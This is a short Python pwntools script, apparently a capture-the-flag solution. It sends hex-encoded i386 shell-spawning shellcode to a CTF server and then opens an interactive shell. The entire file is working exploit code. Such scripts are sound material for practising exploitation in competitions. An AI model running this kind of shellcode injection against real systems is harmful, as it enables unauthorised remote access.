from pwn import *

context(arch = 'i386', os = 'linux')

host = 'pwn2.sect.ctf.rocks'
port = 3000

conn = remote(host, port)
lines = conn.recvuntil('shellcode:')
print lines

asmshellcode = shellcraft.sh()
shellcode = asm(asmshellcode)
s = ''
for b in shellcode:
    s += enhex(b)

conn.send(s + '\r\n')
print conn.recvline()

conn.interactive()
conn.close()

